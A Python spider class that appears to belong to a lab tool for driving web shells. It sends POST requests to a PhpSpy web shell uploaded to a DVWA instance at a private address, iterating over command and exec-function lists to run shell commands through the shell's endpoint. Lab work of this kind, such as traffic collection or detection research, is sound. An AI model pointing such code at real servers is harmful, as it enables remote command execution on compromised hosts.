from webshell_crawler.spiders.spider.abstractWebshell_post_spider import AbstractWebshellPostSpider


class webshellPostSpiderPhpSpy(AbstractWebshellPostSpider):
    """
    webshell功能

    --  shell
    --  php
    --  mysql
    --  upload
    """
    name = "webshell_post_phpspy"
    url = "http://10.108.114.132/dvwa/hackable/uploads/php-webshells-master/PhpSpy%20Ver%202006.php"

    # 允许爬取的域名
    allowed_domains = AbstractWebshellPostSpider.allowed_domains
    # 这里存放要爬取的种子队列
    if url in AbstractWebshellPostSpider.available_urls:
        start_urls = [url]
    else:
        start_urls = []


    def submitPost(self, url):
        command_list = self.get_command_list()
        exec_list = self.get_shell_exec_list()
        for cmd in command_list:
            for exec in exec_list:
                payload = {'execfunc': exec, 'command': cmd}
                yield self.submitPayload(url+'?action=shell&dir=.', payload)

